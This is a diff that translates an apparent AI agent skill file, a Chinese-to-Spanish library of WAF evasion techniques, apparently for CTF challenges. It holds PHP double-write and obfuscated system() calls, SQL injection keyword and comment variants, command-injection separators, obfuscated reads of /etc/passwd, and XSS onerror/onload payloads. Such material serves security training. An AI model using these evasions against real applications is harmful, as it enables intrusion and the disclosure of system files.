@@ -1,89 +1,90 @@
 ---
 name: waf-bypass
-description: WAF 绕过技巧库 — 各类WAF绕过方法
+description: Biblioteca de técnicas de evasión de WAF — métodos de evasión para distintos tipos de WAF
 ---
 
-# WAF 绕过技巧库
+# Biblioteca de Técnicas de Evasión de WAF
 
-## PHP WAF 绕过
+## Evasión de WAF en PHP
 
-### preg_replace 双写绕过（关键技巧）
+### Evasión mediante doble escritura en preg_replace (técnica clave)
 
-`preg_replace()` 会**循环替换**直到没有匹配为止，但如果关键词被替换后**拼出了新的关键词**，只会替换内层，外层保留。
+`preg_replace()` realiza una **sustitución en bucle** hasta que no queden coincidencias, pero si al sustituir la palabra clave se **forma una nueva palabra clave**, solo se sustituye la ocurrencia interna, quedando la externa intacta.
 
-**核心原理**：`preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → 删除中间的 `NSSCTF` → 剩下 `NSS` + `CTF` = `NSSCTF`
+**Principio central**: `preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → elimina el `NSSCTF` del medio → queda `NSS` + `CTF` = `NSSCTF`
 
-**通用模板**：
+**Plantilla general**:
 ```
-假设过滤关键词为 X（如 NSSCTF）
-构造输入: X拆成两半, 在中间嵌入完整X
-即: X前半 + X + X后半
+Supongamos que la palabra clave filtrada es X (p. ej. NSSCTF)
+Construir la entrada: dividir X en dos mitades e insertar X completo en el medio
 
-示例:
-过滤 NSSCTF → 输入 NSS + NSSCTF + CTF = NSSNSSCTFCTF
-过滤 flag   → 输入 fl + flag + ag = flflagag
-过滤 cat    → 输入 ca + cat + t = cacatt
-过滤 system → 输入 sys + system + tem = syssystemtem
+Es decir: primera mitad de X + X + segunda mitad de X
+
+Ejemplos:
+Se filtra NSSCTF → entrada NSS + NSSCTF + CTF = NSSNSSCTFCTF
+Se filtra flag   → entrada fl + flag + ag = flflagag
+Se filtra cat    → entrada ca + cat + t = cacatt
+Se filtra system → entrada sys + system + tem = syssystemtem
 ```
 
-**为什么简单的大小写绕过不适用于 preg_replace**：
-- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` 不匹配 `NSS`（无 i 修饰符）→ 原样输出 `NssCTF`
-- `NssCTF !== "NSSCTF"`（严格比较失败）→ 不通过
-- 只有双写绕过才能让替换后**恰好得到原始关键词字符串**
+**Por qué la simple evasión con mayúsculas/minúsculas no funciona con preg_replace**:
+- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` no coincide con `NSS` (sin el modificador i) → se devuelve `NssCTF` sin cambios
+- `NssCTF !== "NSSCTF"` (falla la comparación estricta) → no se supera la validación
+- Solo la evasión mediante doble escritura logra que, tras la sustitución, se obtenga **exactamente** la cadena de la palabra clave original
 
-**⚠️ 识别场景**：
-- 源码含 `preg_replace('/关键词/', '', $input)` 且需要 `$input` 替换后**等于关键词本身** → 立即用双写绕过
-- 不要尝试大小写绕过（替换后不等于原关键词）或编码绕过（编码字符串不等于原关键词）
+**Advertencia — cómo identificar el escenario**:
+- Si el código fuente contiene `preg_replace('/palabra_clave/', '', $input)` y se requiere que `$input`, tras la sustitución, **sea igual a la propia palabra clave** → aplicar inmediatamente la evasión mediante doble escritura
+- No intentar la evasión con mayúsculas/minúsculas (tras la sustitución no es igual a la palabra clave original) ni la evasión mediante codificación (la cadena codificada no es igual a la palabra clave original)
 
-### 函数名混淆
-- Base64 编码恢复：`$f=base64_decode('c3lzdGVt');$f('id');`
-- 字符串拼接：`$f='sys'.'tem';$f('id');`
-- 可变函数：`$a='sys';$b='tem';$a$b('id');`
+### Ofuscación de nombres de función
+- Recuperación mediante decodificación Base64: `$f=base64_decode('c3lzdGVt');$f('id');`
+- Concatenación de cadenas: `$f='sys'.'tem';$f('id');`
+- Funciones variables: `$a='sys';$b='tem';$a$b('id');`
 
-### 关键字绕过
-- 拆分路径：`'/va'.'r/ww'.'w/ht'.'ml'`
-- 注释绕过：`sys/**/tem('id');`
-- 反转字符串：`$f=strrev('metsys');$f('id');`
+### Evasión de palabras clave
+- División de rutas: `'/va'.'r/ww'.'w/ht'.'ml'`
+- Evasión mediante comentarios: `sys/**/tem('id');`
+- Cadena invertida: `$f=strrev('metsys');$f('id');`
 
-## SQL 注入绕过
+## Evasión de inyección SQL
 
-### 关键字绕过
-- 大小写混合：`SeLeCt` 代替 `SELECT`
-- 内联注释：`S/*!ELECT*/`
-- 双重编码：`%2565` → `%65` → `e`
-- 等价函数：`GROUP_CONCAT` 替代 `concat_ws`
+### Evasión de palabras clave
+- Mezcla de mayúsculas/minúsculas: `SeLeCt` en lugar de `SELECT`
+- Comentarios en línea: `S/*!ELECT*/`
+- Doble codificación: `%2565` → `%65` → `e`
+- Funciones equivalentes: `GROUP_CONCAT` en lugar de `concat_ws`
 
-### 注释符变体
-- `-- -` 代替 `--`
-- `--+` 代替 `-- `
-- `#` 代替 `--`
+### Variantes del símbolo de comentario
+- `-- -` en lugar de `--`
+- `--+` en lugar de `-- `
+- `#` en lugar de `--`
 
-## 命令注入绕过
+## Evasión de inyección de comandos
 
-### 分隔符变体
-- 换行符：`id\nwhoami`
-- 管道符：`id|whoami`
-- 逻辑运算：`id&&whoami`
-- 子 shell：`$(id)` 或 `` `id` ``
+### Variantes de separadores
+- Salto de línea: `id\nwhoami`
+- Tubería: `id|whoami`
+- Operador lógico: `id&&whoami`
+- Subshell: `$(id)` o `` `id` ``
 
-### 命令混淆
-- 变量拼接：`a=i;b=d;$a$b`
-- 通配符：`/bin/ca? /etc/pas?d`
-- 空变量：`c'a't /etc/passwd`
-- 转义：`c\at /etc/passwd`
+### Ofuscación de comandos
+- Concatenación de variables: `a=i;b=d;$a$b`
+- Comodines: `/bin/ca? /etc/pas?d`
+- Variable vacía: `c'a't /etc/passwd`
+- Escape: `c\at /etc/passwd`
 
-## XSS 绕过
+## Evasión de XSS
 
-### 标签变体
+### Variantes de etiquetas
 - `<img src=x onerror=alert(1)>`
 - `<svg onload=alert(1)>`
 - `<body onload=alert(1)>`
 - `<input onfocus=alert(1) autofocus>`
 
-### 事件处理器
+### Manejadores de eventos
 - `onerror`, `onload`, `onclick`, `onfocus`, `onmouseover`
 
-### 编码绕过
-- HTML 实体编码
-- Unicode 编码
-- Base64 编码（配合 eval）
+### Evasión mediante codificación
+- Codificación de entidades HTML
+- Codificación Unicode
+- Codificación Base64 (combinada con eval)
